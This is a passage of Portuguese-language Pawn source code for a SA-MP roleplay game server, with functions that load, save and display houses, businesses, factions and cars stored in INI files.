	DOF2_SetInt(ficheiro, "Ammo2", hInfo[i][Ammo2]);
	DOF2_SetInt(ficheiro, "Arma3", hInfo[i][Arma3]);
	DOF2_SetInt(ficheiro, "Ammo3", hInfo[i][Ammo3]);
	DOF2_SetInt(ficheiro, "IsCaravana", hInfo[i][IsCaravana]);
	DOF2_SetInt(ficheiro, "CarroCaravanaID", hInfo[i][CarroCaravanaID]);
	DOF2_SetFloat(ficheiro, "GaragemEnterX", hInfo[i][GaragemEnterX]);
	DOF2_SetFloat(ficheiro, "GaragemEnterY", hInfo[i][GaragemEnterY]);
	DOF2_SetFloat(ficheiro, "GaragemEnterZ", hInfo[i][GaragemEnterZ]);
	DOF2_SetInt(ficheiro, "GaragemEnterInterior", hInfo[i][GaragemEnterInterior]);
	DOF2_SetInt(ficheiro, "GaragemEnterVirtualWorld", hInfo[i][GaragemEnterVirtualWorld]);
	DOF2_SetFloat(ficheiro, "GaragemExitX", hInfo[i][GaragemExitX]);
	DOF2_SetFloat(ficheiro, "GaragemExitY", hInfo[i][GaragemExitY]);
	DOF2_SetFloat(ficheiro, "GaragemExitZ", hInfo[i][GaragemExitZ]);
	DOF2_SetFloat(ficheiro, "GaragemExitAngle", hInfo[i][GaragemExitAngle]);
	DOF2_SetInt(ficheiro, "GaragemVirtualWorld", hInfo[i][GaragemVirtualWorld]);
	DOF2_SetInt(ficheiro, "GaragemPickupID", hInfo[i][GaragemPickupID]);
	DOF2_SetInt(ficheiro, "GaragemLocked", hInfo[i][GaragemLocked]);

	DOF2_SaveFile();

	return 1;
}

public AtualizarCasa(id)
{
	new string[128];
	new label[512];

 	DestroyDynamicPickup(HousePickup[id]);
 	DestroyDynamicPickup(GaragemPickup[id]);
  	DestroyDynamic3DTextLabel(HouseLabel[id]);
  	DestroyDynamic3DTextLabel(GaragemLabel[id]);

	if(hInfo[id][Comprada] == 1)
	{
		format(string, sizeof(string), "{FF0000}[ {00FF00}CASA COMPRADA {FF0000}]"); strcat(label, string);
		format(string, sizeof(string), "\n{FF0000}[ {00FF00}Descrição: {FF9900}%s {FF0000}]", hInfo[id][Nome]); strcat(label, string);
		format(string, sizeof(string), "\n{FF0000}[ {00FF00}Dono: {FF9900}%s {FF0000}]", hInfo[id][Owner]); strcat(label, string);
		if(hInfo[id][AluguerStatus] == 1)
		{
			format(string, sizeof(string), "\n{FF0000}[ {00FF00}Aluguer: {FF9900}%d$ {FF0000}]", hInfo[id][Aluguer]); strcat(label, string);
		}
		format(string, sizeof(string), "\n{FF0000}[ {00FF00}ID: {FF9900}%d {FF0000}]", id); strcat(label, string);
	}
	else
	{
 		format(string, sizeof(string), "{00FF00}[ {FF0000}CASA PARA VENDA {00FF00}]"); strcat(label, string);
 		format(string, sizeof(string), "\n{00FF00}[ {FF0000}Descrição: {FFFFFF}%s {00FF00}]", hInfo[id][Nome]); strcat(label, string);
   		format(string, sizeof(string), "\n{00FF00}[ {FF0000}Preço: {FFFFFF}%d $ {00FF00}]", hInfo[id][Price]); strcat(label, string);
   		format(string, sizeof(string), "\n{00FF00}[ {FF0000}ID: {FFFFFF}%d {00FF00}]", id); strcat(label, string);
	}

	HousePickup[id] = CreateDynamicPickup(hInfo[id][PickupID], 1, hInfo[id][EnterX], hInfo[id][EnterY], hInfo[id][EnterZ], -1, -1, -1, 100.0);
	HouseLabel[id] = CreateDynamic3DTextLabel(label, COLOR_WHITE, hInfo[id][EnterX], hInfo[id][EnterY], hInfo[id][EnterZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
	
	format(label, sizeof(label), "");
	
	format(string, sizeof(string), "{00FF00}[ {FF0000}GARAGEM {00FF00}]"); strcat(label, string);
	format(string, sizeof(string), "\n{00FF00}[ {FF0000}ID: {FFFFFF}%d {00FF00}]", id); strcat(label, string);
	
	GaragemPickup[id] = CreateDynamicPickup(hInfo[id][GaragemPickupID], 1, hInfo[id][GaragemEnterX], hInfo[id][GaragemEnterY], hInfo[id][GaragemEnterZ], -1, -1, -1, 100.0);
	GaragemLabel[id] = CreateDynamic3DTextLabel(label, COLOR_WHITE, hInfo[id][GaragemEnterX], hInfo[id][GaragemEnterY], hInfo[id][GaragemEnterZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);

	return 1;
}

public CarregarBizzes()
{
	new ficheiro[64];
	new tick1;
	new tick2;

	tick1 = GetTickCount();

	for(new i = 0; i < MAX_BUSINESS; i++)
	{
	    if(i == 0) continue;

    	format(ficheiro, sizeof(ficheiro), "PCRP/Business/%d.ini", i);
    	if(!DOF2_FileExists(ficheiro))
  		{
	  		DOF2_CreateFile(ficheiro);

            DOF2_SetInt(ficheiro, "ID", i);
            DOF2_SetString(ficheiro, "Nome", "Unused");
            DOF2_SetString(ficheiro, "Owner", "Ninguém");
            DOF2_SetInt(ficheiro, "Type", 0);
  			DOF2_SetFloat(ficheiro, "EnterX", 0);
  			DOF2_SetFloat(ficheiro, "EnterY", 0);
  			DOF2_SetFloat(ficheiro, "EnterZ", 0);
  			DOF2_SetFloat(ficheiro, "EnterAngle", 0);
  			DOF2_SetInt(ficheiro, "EnterInterior", 0);
  			DOF2_SetInt(ficheiro, "EnterVirtualWorld", 0);
  			DOF2_SetInt(ficheiro, "Interior", 0);
  			DOF2_SetInt(ficheiro, "VirtualWorld", i);
  			DOF2_SetInt(ficheiro, "Comprada", 0);
            DOF2_SetInt(ficheiro, "Price", 0);
            DOF2_SetInt(ficheiro, "Locked", 1);
            DOF2_SetInt(ficheiro, "Produtos", 0);
            DOF2_SetInt(ficheiro, "Bank", 0);
            DOF2_SetInt(ficheiro, "PickupID", 0);
            DOF2_SetInt(ficheiro, "Entrada", 0);
            DOF2_SetFloat(ficheiro, "ExitX", 0);
            DOF2_SetFloat(ficheiro, "ExitY", 0);
            DOF2_SetFloat(ficheiro, "ExitZ", 0);
            DOF2_SetFloat(ficheiro, "ExitAngle", 0);
            DOF2_SetInt(ficheiro, "Seguradora", 0);
            DOF2_SetFloat(ficheiro, "ActorX", 0);
            DOF2_SetFloat(ficheiro, "ActorY", 0);
            DOF2_SetFloat(ficheiro, "ActorZ", 0);
            DOF2_SetFloat(ficheiro, "ActorAngle", 0);
            DOF2_SetInt(ficheiro, "ActorModel", 1);
            
    		DOF2_SaveFile();
   		}
   		else
   		{
   		    cInfo[i][ID] = DOF2_GetInt(ficheiro, "ID");
   		    format(bInfo[i][Nome], 32, "%s", DOF2_GetString(ficheiro, "Nome"));
   		    format(bInfo[i][Owner], 32, "%s", DOF2_GetString(ficheiro, "Owner"));
   		    bInfo[i][Type] = DOF2_GetInt(ficheiro, "Type");
   		    bInfo[i][EnterX] = DOF2_GetFloat(ficheiro, "EnterX");
   		    bInfo[i][EnterY] = DOF2_GetFloat(ficheiro, "EnterY");
   		    bInfo[i][EnterZ] = DOF2_GetFloat(ficheiro, "EnterZ");
   		    bInfo[i][EnterAngle] = DOF2_GetFloat(ficheiro, "EnterAngle");
   		    bInfo[i][EnterInterior] = DOF2_GetInt(ficheiro, "EnterInterior");
   		    bInfo[i][EnterVirtualWorld] = DOF2_GetInt(ficheiro, "EnterVirtualWorld");
   		    bInfo[i][Interior] = DOF2_GetInt(ficheiro, "Interior");
   		    bInfo[i][VirtualWorld] = DOF2_GetInt(ficheiro, "VirtualWorld");
   		    bInfo[i][Comprada] = DOF2_GetInt(ficheiro, "Comprada");
   		    bInfo[i][Price] = DOF2_GetInt(ficheiro, "Price");
   		    bInfo[i][Locked] = DOF2_GetInt(ficheiro, "Locked");
   		    bInfo[i][Produtos] = DOF2_GetInt(ficheiro, "Produtos");
   		    bInfo[i][Bank] = DOF2_GetInt(ficheiro, "Bank");
   		    bInfo[i][PickupID] = DOF2_GetInt(ficheiro, "PickupID");
   		    bInfo[i][Entrada] = DOF2_GetInt(ficheiro, "Entrada");
   		    bInfo[i][ExitX] = DOF2_GetFloat(ficheiro, "ExitX");
   		    bInfo[i][ExitY] = DOF2_GetFloat(ficheiro, "ExitY");
   		    bInfo[i][ExitZ] = DOF2_GetFloat(ficheiro, "ExitZ");
   		    bInfo[i][ExitAngle] = DOF2_GetFloat(ficheiro, "ExitAngle");
   		    bInfo[i][Seguradora] = DOF2_GetInt(ficheiro, "Seguradora");
   		    bInfo[i][ActorX] = DOF2_GetFloat(ficheiro, "ActorX");
   		    bInfo[i][ActorY] = DOF2_GetFloat(ficheiro, "ActorY");
   		    bInfo[i][ActorZ] = DOF2_GetFloat(ficheiro, "ActorZ");
   		    bInfo[i][ActorAngle] = DOF2_GetFloat(ficheiro, "ActorAngle");
   		    bInfo[i][ActorModel] = DOF2_GetInt(ficheiro, "ActorModel");
		}
		AtualizarBiz(i);
	}
	
	tick2 = GetTickCount();
	printf("\n [PC:RP] Lojas carregadas (%d ms)", tick2-tick1);
	
	return 1;
}

public GuardarBizzes()
{
	new ficheiro[64];
	for(new i = 0; i < MAX_BUSINESS; i++)
	{
	    if(i == 0) continue;
	    format(ficheiro, sizeof(ficheiro), "PCRP/Business/%d.ini", i);

		DOF2_SetInt(ficheiro, "ID", i);
  		DOF2_SetString(ficheiro, "Nome", bInfo[i][Nome]);
    	DOF2_SetString(ficheiro, "Owner", bInfo[i][Owner]);
     	DOF2_SetInt(ficheiro, "Type", bInfo[i][Type]);
  		DOF2_SetFloat(ficheiro, "EnterX", bInfo[i][EnterX]);
  		DOF2_SetFloat(ficheiro, "EnterY", bInfo[i][EnterY]);
		DOF2_SetFloat(ficheiro, "EnterZ", bInfo[i][EnterZ]);
		DOF2_SetFloat(ficheiro, "EnterAngle", bInfo[i][EnterAngle]);
		DOF2_SetInt(ficheiro, "EnterInterior", bInfo[i][EnterInterior]);
		DOF2_SetInt(ficheiro, "EnterVirtualWorld", bInfo[i][EnterVirtualWorld]);
		DOF2_SetInt(ficheiro, "Interior", bInfo[i][Interior]);
		DOF2_SetInt(ficheiro, "VirtualWorld", bInfo[i][VirtualWorld]);
		DOF2_SetInt(ficheiro, "Comprada", bInfo[i][Comprada]);
		DOF2_SetInt(ficheiro, "Price", bInfo[i][Price]);
  		DOF2_SetInt(ficheiro, "Locked", bInfo[i][Locked]);
  		DOF2_SetInt(ficheiro, "Produtos", bInfo[i][Produtos]);
  		DOF2_SetInt(ficheiro, "Bank", bInfo[i][Bank]);
  		DOF2_SetInt(ficheiro, "PickupID", bInfo[i][PickupID]);
  		DOF2_SetInt(ficheiro, "Entrada", bInfo[i][Entrada]);
        DOF2_SetFloat(ficheiro, "ExitX", bInfo[i][ExitX]);
        DOF2_SetFloat(ficheiro, "ExitY", bInfo[i][ExitY]);
        DOF2_SetFloat(ficheiro, "ExitZ", bInfo[i][ExitZ]);
        DOF2_SetFloat(ficheiro, "ExitAngle", bInfo[i][ExitAngle]);
        DOF2_SetInt(ficheiro, "Seguradora", bInfo[i][Seguradora]);
        DOF2_SetFloat(ficheiro, "ActorX", bInfo[i][ActorX]);
        DOF2_SetFloat(ficheiro, "ActorY", bInfo[i][ActorY]);
        DOF2_SetFloat(ficheiro, "ActorZ", bInfo[i][ActorZ]);
        DOF2_SetFloat(ficheiro, "ActorAngle", bInfo[i][ActorAngle]);
        DOF2_SetInt(ficheiro, "ActorModel", bInfo[i][ActorModel]);

		DOF2_SaveFile();

	}
	return 1;
}

public GuardarBizz(id)
{
	new i = id;
	new ficheiro[64];

	format(ficheiro, sizeof(ficheiro), "PCRP/Business/%d.ini", i);

	DOF2_SetInt(ficheiro, "ID", i);
	DOF2_SetString(ficheiro, "Nome", bInfo[i][Nome]);
	DOF2_SetString(ficheiro, "Owner", bInfo[i][Owner]);
	DOF2_SetInt(ficheiro, "Type", bInfo[i][Type]);
	DOF2_SetFloat(ficheiro, "EnterX", bInfo[i][EnterX]);
	DOF2_SetFloat(ficheiro, "EnterY", bInfo[i][EnterY]);
	DOF2_SetFloat(ficheiro, "EnterZ", bInfo[i][EnterZ]);
	DOF2_SetInt(ficheiro, "EnterInterior", bInfo[i][EnterInterior]);
	DOF2_SetInt(ficheiro, "EnterVirtualWorld", bInfo[i][EnterVirtualWorld]);
	DOF2_SetInt(ficheiro, "Interior", bInfo[i][Interior]);
	DOF2_SetInt(ficheiro, "VirtualWorld", bInfo[i][VirtualWorld]);
	DOF2_SetInt(ficheiro, "Comprada", bInfo[i][Comprada]);
	DOF2_SetInt(ficheiro, "Price", bInfo[i][Price]);
	DOF2_SetInt(ficheiro, "Locked", bInfo[i][Locked]);
  	DOF2_SetInt(ficheiro, "Produtos", bInfo[i][Produtos]);
	DOF2_SetInt(ficheiro, "Bank", bInfo[i][Bank]);
	DOF2_SetInt(ficheiro, "PickupID", bInfo[i][PickupID]);
	DOF2_SetInt(ficheiro, "Entrada", bInfo[i][Entrada]);
 	DOF2_SetFloat(ficheiro, "ExitX", bInfo[i][ExitX]);
 	DOF2_SetFloat(ficheiro, "ExitY", bInfo[i][ExitY]);
 	DOF2_SetFloat(ficheiro, "ExitZ", bInfo[i][ExitZ]);
 	DOF2_SetFloat(ficheiro, "ExitAngle", bInfo[i][ExitAngle]);
 	DOF2_SetInt(ficheiro, "Seguradora", bInfo[i][Seguradora]);
  	DOF2_SetFloat(ficheiro, "ActorX", bInfo[i][ActorX]);
 	DOF2_SetFloat(ficheiro, "ActorY", bInfo[i][ActorY]);
 	DOF2_SetFloat(ficheiro, "ActorZ", bInfo[i][ActorZ]);
 	DOF2_SetFloat(ficheiro, "ActorAngle", bInfo[i][ActorAngle]);
 	DOF2_SetInt(ficheiro, "ActorModel", bInfo[i][ActorModel]);
 	
	DOF2_SaveFile();

	return 1;
}

public AtualizarBiz(id)
{
	new string[128];
	new label[512];
	new type[32];

 	DestroyDynamicPickup(BizPickup[id]);
  	DestroyDynamic3DTextLabel(BizLabel[id]);

	switch(bInfo[id][Type])
	{
	    case 0: { type = "Não Configurada"; }
	    case BTYPE_RESTAURANTE: { type = "Restaurante"; }
	    case BTYPE_BAR: { type = "Bar"; }
	    case BTYPE_247: { type = "Loja 24/7"; }
	    case BTYPE_GASOLINA: { type = "Gasolineira"; }
	    case BTYPE_TELE: { type = "Loja de Telecomunicações"; }
	    case BTYPE_STAND: { type = "Stand"; }
	    case BTYPE_CACA: { type = "Loja de Caça"; }
	    case BTYPE_ROUPA: { type = "Loja de Roupa"; }
	    case BTYPE_FARMACIA: { type = "Farmácia"; }
	    case BTYPE_APOSTAS: { type = "Casa de Apostas"; }
	    case BTYPE_SEGURADORA: { type = "Seguradora"; }
	    case BTYPE_CENTROCOMERCIAL: { type = "Centro Comercial"; }
	}
	if(bInfo[id][Comprada] == 1)
	{
		format(string, sizeof(string), "{FF0000}[ {00FFFB}NEGÓCIO COMPRADO {FF0000}]"); strcat(label, string);
		format(string, sizeof(string), "\n{FF0000}[ {00FFFB}Nome: {FF9900}%s {FF0000}]", bInfo[id][Nome]); strcat(label, string);
		format(string, sizeof(string), "\n{FF0000}[ {00FFFB}Tipo: {FF9900}%s {FF0000}]", type); strcat(label, string);
		format(string, sizeof(string), "\n{FF0000}[ {00FFFB}Entrada: {FF9900}%d $ {FF0000}]", bInfo[id][Entrada]); strcat(label, string);
		format(string, sizeof(string), "\n{FF0000}[ {00FFFB}Dono: {FF9900}%s {FF0000}]", bInfo[id][Owner]); strcat(label, string);
		format(string, sizeof(string), "\n{FF0000}[ {00FFFB}ID: {FF9900}%d {FF0000}]", id); strcat(label, string);
	}
	else
	{
 		format(string, sizeof(string), "{00FFFB}[ {FF0000}NEGÓCIO PARA VENDA {00FFFB}]"); strcat(label, string);
 		format(string, sizeof(string), "\n{00FFFB}[ {FF0000}Tipo: {FFFFFF}%s {00FFFB}]", type); strcat(label, string);
   		format(string, sizeof(string), "\n{00FFFB}[ {FF0000}Preço: {FFFFFF}%d $ {00FFFB}]", bInfo[id][Price]); strcat(label, string);
   		format(string, sizeof(string), "\n{00FFFB}[ {FF0000}ID: {FFFFFF}%d {00FFFB}]", id); strcat(label, string);
	}

	BizPickup[id] = CreateDynamicPickup(bInfo[id][PickupID], 1, bInfo[id][EnterX], bInfo[id][EnterY], bInfo[id][EnterZ], -1, -1, -1, 100.0);
	BizLabel[id] = CreateDynamic3DTextLabel(label, COLOR_WHITE, bInfo[id][EnterX], bInfo[id][EnterY], bInfo[id][EnterZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
	
	if(bInfo[id][ActorX] != 0 && bInfo[id][ActorY] != 0) // azeite
	{
	    if(ActorFirstTime[id] == false)
	    {
 	  		DestroyActor(BizActor[id]);
	  		DestroyDynamic3DTextLabel(ActorLabel[id]);
	    }
  		
		BizActor[id] = CreateActor(bInfo[id][ActorModel], bInfo[id][ActorX], bInfo[id][ActorY], bInfo[id][ActorZ], bInfo[id][ActorAngle]);
        ActorLabel[id] = CreateDynamic3DTextLabel("{FF9900}[ {00FF00}'n' {FF0000}para abrir o menu {FF9900}]", COLOR_WHITE, bInfo[id][ActorX], bInfo[id][ActorY], bInfo[id][ActorZ]+1, 12, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);

	 	SetActorVirtualWorld(BizActor[id], id);
	 	SetActorInvulnerable(BizActor[id], true);
	 	
	 	ActorFirstTime[id] = true;
	}
 	
	return 1;
}

public CarregarFactions()
{
	new ficheiro[64];
	new tick1;
	new tick2;

	tick1 = GetTickCount();

	for(new i = 0; i < MAX_FACTIONS; i++)
	{
	    if(i == 0) continue;

    	format(ficheiro, sizeof(ficheiro), "PCRP/Factions/%d.ini", i);
    	if(!DOF2_FileExists(ficheiro))
  		{
	  		DOF2_CreateFile(ficheiro);

            DOF2_SetString(ficheiro, "Nome", "Unused");
            DOF2_SetInt(ficheiro, "Type", 0);
            DOF2_SetInt(ficheiro, "Legal", 0);
            DOF2_SetInt(ficheiro, "Bank", 0);
  			DOF2_SetFloat(ficheiro, "X", 0);
  			DOF2_SetFloat(ficheiro, "Y", 0);
  			DOF2_SetFloat(ficheiro, "Z", 0);
            DOF2_SetFloat(ficheiro, "A", 0);
  			DOF2_SetString(ficheiro, "Rank1", "Unused");
  			DOF2_SetString(ficheiro, "Rank2", "Unused");
  			DOF2_SetString(ficheiro, "Rank3", "Unused");
  			DOF2_SetString(ficheiro, "Rank4", "Unused");
  			DOF2_SetString(ficheiro, "Rank5", "Unused");
  			DOF2_SetString(ficheiro, "Rank6", "Unused");
  			DOF2_SetInt(ficheiro, "SalarioRank1", 0);
  			DOF2_SetInt(ficheiro, "SalarioRank2", 0);
  			DOF2_SetInt(ficheiro, "SalarioRank3", 0);
  			DOF2_SetInt(ficheiro, "SalarioRank4", 0);
  			DOF2_SetInt(ficheiro, "SalarioRank5", 0);
  			DOF2_SetInt(ficheiro, "SalarioRank6", 0);
  			DOF2_SetInt(ficheiro, "SkinRank1", 0);
  			DOF2_SetInt(ficheiro, "SkinRank2", 0);
  			DOF2_SetInt(ficheiro, "SkinRank3", 0);
  			DOF2_SetInt(ficheiro, "SkinRank4", 0);
  			DOF2_SetInt(ficheiro, "SkinRank5", 0);
  			DOF2_SetInt(ficheiro, "SkinRank6", 0);
  			DOF2_SetInt(ficheiro, "JoinRank", 0);
  			DOF2_SetString(ficheiro, "Color", "-1");
  			DOF2_SetInt(ficheiro, "UseDuty", 0);
  			DOF2_SetFloat(ficheiro, "DutyX", 0);
  			DOF2_SetFloat(ficheiro, "DutyY", 0);
  			DOF2_SetFloat(ficheiro, "DutyZ", 0);
  			DOF2_SetInt(ficheiro, "DutyVirtualWorld", 0);
  			DOF2_SetInt(ficheiro, "DutyInterior", 0);

    		DOF2_SaveFile();
   		}
   		else
   		{
   		    format(fInfo[i][Nome], 32, "%s", DOF2_GetString(ficheiro, "Nome"));
   		    fInfo[i][Type] = DOF2_GetInt(ficheiro, "Type");
   		    fInfo[i][Legal] = DOF2_GetInt(ficheiro, "Legal");
   		    fInfo[i][Bank] = DOF2_GetInt(ficheiro, "Bank");
   		    fInfo[i][X] = DOF2_GetFloat(ficheiro, "X");
   		    fInfo[i][Y] = DOF2_GetFloat(ficheiro, "Y");
   		    fInfo[i][Z] = DOF2_GetFloat(ficheiro, "Z");
   		    fInfo[i][A] = DOF2_GetFloat(ficheiro, "A");
   		    format(fInfo[i][Rank1], 32, "%s", DOF2_GetString(ficheiro, "Rank1"));
   		    format(fInfo[i][Rank2], 32, "%s", DOF2_GetString(ficheiro, "Rank2"));
   		    format(fInfo[i][Rank3], 32, "%s", DOF2_GetString(ficheiro, "Rank3"));
   		    format(fInfo[i][Rank4], 32, "%s", DOF2_GetString(ficheiro, "Rank4"));
   		    format(fInfo[i][Rank5], 32, "%s", DOF2_GetString(ficheiro, "Rank5"));
   		    format(fInfo[i][Rank6], 32, "%s", DOF2_GetString(ficheiro, "Rank6"));
   		    fInfo[i][SalarioRank1] = DOF2_GetInt(ficheiro, "SalarioRank1");
   		    fInfo[i][SalarioRank2] = DOF2_GetInt(ficheiro, "SalarioRank2");
   		    fInfo[i][SalarioRank3] = DOF2_GetInt(ficheiro, "SalarioRank3");
   		    fInfo[i][SalarioRank4] = DOF2_GetInt(ficheiro, "SalarioRank4");
   		    fInfo[i][SalarioRank5] = DOF2_GetInt(ficheiro, "SalarioRank5");
   		    fInfo[i][SalarioRank6] = DOF2_GetInt(ficheiro, "SalarioRank6");
   		    fInfo[i][SkinRank1] = DOF2_GetInt(ficheiro, "SkinRank1");
   		    fInfo[i][SkinRank2] = DOF2_GetInt(ficheiro, "SkinRank2");
   		    fInfo[i][SkinRank3] = DOF2_GetInt(ficheiro, "SkinRank3");
   		    fInfo[i][SkinRank4] = DOF2_GetInt(ficheiro, "SkinRank4");
   		    fInfo[i][SkinRank5] = DOF2_GetInt(ficheiro, "SkinRank5");
   		    fInfo[i][SkinRank6] = DOF2_GetInt(ficheiro, "SkinRank6");
   		    fInfo[i][JoinRank] = DOF2_GetInt(ficheiro, "JoinRank");
   		    format(fInfo[i][Color], 32, "%s", DOF2_GetString(ficheiro, "Color"));
   		    fInfo[i][UseDuty] = DOF2_GetInt(ficheiro, "UseDuty");
   		    fInfo[i][DutyX] = DOF2_GetFloat(ficheiro, "DutyX");
   		    fInfo[i][DutyY] = DOF2_GetFloat(ficheiro, "DutyY");
   		    fInfo[i][DutyZ] = DOF2_GetFloat(ficheiro, "DutyZ");
   		    fInfo[i][DutyVirtualWorld] = DOF2_GetInt(ficheiro, "DutyVirtualWorld");
   		    fInfo[i][DutyInterior] = DOF2_GetInt(ficheiro, "DutyInterior");
		}
	}
	
	tick2 = GetTickCount();
    printf("\n [PC:RP] Factions carregadas (%d ms)", tick2-tick1);

	return 1;
}

public GuardarFactions()
{
	new ficheiro[64];
	for(new i = 0; i < MAX_FACTIONS; i++)
	{
	    if(i == 0) continue;
	    format(ficheiro, sizeof(ficheiro), "PCRP/Factions/%d.ini", i);

		DOF2_SetString(ficheiro, "Nome", fInfo[i][Nome]);
		DOF2_SetInt(ficheiro, "Type", fInfo[i][Type]);
		DOF2_SetInt(ficheiro, "Legal", fInfo[i][Legal]);
		DOF2_SetInt(ficheiro, "Bank", fInfo[i][Bank]);
		DOF2_SetFloat(ficheiro, "X", fInfo[i][X]);
		DOF2_SetFloat(ficheiro, "Y", fInfo[i][Y]);
		DOF2_SetFloat(ficheiro, "Z", fInfo[i][Z]);
		DOF2_SetFloat(ficheiro, "A", fInfo[i][A]);
		DOF2_SetString(ficheiro, "Rank1", fInfo[i][Rank1]);
		DOF2_SetString(ficheiro, "Rank2", fInfo[i][Rank2]);
		DOF2_SetString(ficheiro, "Rank3", fInfo[i][Rank3]);
		DOF2_SetString(ficheiro, "Rank4", fInfo[i][Rank4]);
		DOF2_SetString(ficheiro, "Rank5", fInfo[i][Rank5]);
		DOF2_SetString(ficheiro, "Rank6", fInfo[i][Rank6]);
		DOF2_SetInt(ficheiro, "SalarioRank1", fInfo[i][SalarioRank1]);
		DOF2_SetInt(ficheiro, "SalarioRank2", fInfo[i][SalarioRank2]);
		DOF2_SetInt(ficheiro, "SalarioRank3", fInfo[i][SalarioRank3]);
		DOF2_SetInt(ficheiro, "SalarioRank4", fInfo[i][SalarioRank4]);
		DOF2_SetInt(ficheiro, "SalarioRank5", fInfo[i][SalarioRank5]);
		DOF2_SetInt(ficheiro, "SalarioRank6", fInfo[i][SalarioRank6]);
		DOF2_SetInt(ficheiro, "SkinRank1", fInfo[i][SkinRank1]);
		DOF2_SetInt(ficheiro, "SkinRank2", fInfo[i][SkinRank2]);
		DOF2_SetInt(ficheiro, "SkinRank3", fInfo[i][SkinRank3]);
		DOF2_SetInt(ficheiro, "SkinRank4", fInfo[i][SkinRank4]);
		DOF2_SetInt(ficheiro, "SkinRank5", fInfo[i][SkinRank5]);
		DOF2_SetInt(ficheiro, "SkinRank6", fInfo[i][SkinRank6]);
		DOF2_SetInt(ficheiro, "JoinRank", fInfo[i][JoinRank]);
		DOF2_SetString(ficheiro, "Color", fInfo[i][Color]);
		DOF2_SetInt(ficheiro, "UseDuty", fInfo[i][UseDuty]);
		DOF2_SetFloat(ficheiro, "DutyX", fInfo[i][DutyX]);
		DOF2_SetFloat(ficheiro, "DutyY", fInfo[i][DutyY]);
		DOF2_SetFloat(ficheiro, "DutyZ", fInfo[i][DutyZ]);
		DOF2_SetInt(ficheiro, "DutyVirtualWorld", fInfo[i][DutyVirtualWorld]);
		DOF2_SetInt(ficheiro, "DutyInterior", fInfo[i][DutyInterior]);

		DOF2_SaveFile();

	}
	return 1;
}

public GuardarFaction(id)
{
	new i = id;
	new ficheiro[64];

	format(ficheiro, sizeof(ficheiro), "PCRP/Factions/%d.ini", i);

	DOF2_SetString(ficheiro, "Nome", fInfo[i][Nome]);
	DOF2_SetInt(ficheiro, "Type", fInfo[i][Type]);
	DOF2_SetInt(ficheiro, "Legal", fInfo[i][Legal]);
	DOF2_SetInt(ficheiro, "Bank", fInfo[i][Bank]);
	DOF2_SetFloat(ficheiro, "X", fInfo[i][X]);
	DOF2_SetFloat(ficheiro, "Y", fInfo[i][Y]);
	DOF2_SetFloat(ficheiro, "Z", fInfo[i][Z]);
	DOF2_SetFloat(ficheiro, "A", fInfo[i][A]);
	DOF2_SetString(ficheiro, "Rank1", fInfo[i][Rank1]);
	DOF2_SetString(ficheiro, "Rank2", fInfo[i][Rank2]);
	DOF2_SetString(ficheiro, "Rank3", fInfo[i][Rank3]);
	DOF2_SetString(ficheiro, "Rank4", fInfo[i][Rank4]);
	DOF2_SetString(ficheiro, "Rank5", fInfo[i][Rank5]);
	DOF2_SetString(ficheiro, "Rank6", fInfo[i][Rank6]);
	DOF2_SetInt(ficheiro, "SalarioRank1", fInfo[i][SalarioRank1]);
	DOF2_SetInt(ficheiro, "SalarioRank2", fInfo[i][SalarioRank2]);
	DOF2_SetInt(ficheiro, "SalarioRank3", fInfo[i][SalarioRank3]);
	DOF2_SetInt(ficheiro, "SalarioRank4", fInfo[i][SalarioRank4]);
	DOF2_SetInt(ficheiro, "SalarioRank5", fInfo[i][SalarioRank5]);
	DOF2_SetInt(ficheiro, "SalarioRank6", fInfo[i][SalarioRank6]);
	DOF2_SetInt(ficheiro, "SkinRank1", fInfo[i][SkinRank1]);
	DOF2_SetInt(ficheiro, "SkinRank2", fInfo[i][SkinRank2]);
	DOF2_SetInt(ficheiro, "SkinRank3", fInfo[i][SkinRank3]);
	DOF2_SetInt(ficheiro, "SkinRank4", fInfo[i][SkinRank4]);
	DOF2_SetInt(ficheiro, "SkinRank5", fInfo[i][SkinRank5]);
	DOF2_SetInt(ficheiro, "SkinRank6", fInfo[i][SkinRank6]);
	DOF2_SetInt(ficheiro, "JoinRank", fInfo[i][JoinRank]);
	DOF2_SetString(ficheiro, "Color", fInfo[i][Color]);
	DOF2_SetInt(ficheiro, "UseDuty", fInfo[i][UseDuty]);
	DOF2_SetFloat(ficheiro, "DutyX", fInfo[i][DutyX]);
	DOF2_SetFloat(ficheiro, "DutyY", fInfo[i][DutyY]);
	DOF2_SetFloat(ficheiro, "DutyZ", fInfo[i][DutyZ]);
	DOF2_SetInt(ficheiro, "DutyVirtualWorld", fInfo[i][DutyVirtualWorld]);
	DOF2_SetInt(ficheiro, "DutyInterior", fInfo[i][DutyInterior]);

	DOF2_SaveFile();

	return 1;
}

public CarregarCarros()
{
	new ficheiro[64];
	new mat[63];
	new tick1;
	new tick2;

	tick1 = GetTickCount();

	for(new i = 0; i < MAX_CARROS; i++)
	{
	    if(i == 0) continue;
	    
    	format(ficheiro, sizeof(ficheiro), "PCRP/Carros/%d.ini", i);
    	if(!DOF2_FileExists(ficheiro))
  		{
	  		DOF2_CreateFile(ficheiro);

			DOF2_SetInt(ficheiro, "ID", i);
            DOF2_SetInt(ficheiro, "Model", 501);
  			DOF2_SetFloat(ficheiro, "X", 1000);
  			DOF2_SetFloat(ficheiro, "Y", 1000);
  			DOF2_SetFloat(ficheiro, "Z", 1000);
  			DOF2_SetFloat(ficheiro, "Angle", 0);
  			DOF2_SetInt(ficheiro, "Color1", 1);
  			DOF2_SetInt(ficheiro, "Color2", 1);
  			DOF2_SetInt(ficheiro, "Faction", 0);
  			DOF2_SetInt(ficheiro, "Type", 0);
  			DOF2_SetInt(ficheiro, "Comprado", 0);
  			DOF2_SetInt(ficheiro, "Travao", 0);
  			DOF2_SetInt(ficheiro, "Kilometros", 0);
  			DOF2_SetInt(ficheiro, "Metros", 0);
  			DOF2_SetInt(ficheiro, "Neon", 0);
  			DOF2_SetInt(ficheiro, "NeonStatus", 0);
  			DOF2_SetInt(ficheiro, "Gasolina", 100);
  			DOF2_SetInt(ficheiro, "Trancado", 0);
  			DOF2_SetFloat(ficheiro, "Vida", 1000.0);
  			DOF2_SetInt(ficheiro, "mod1", -1);
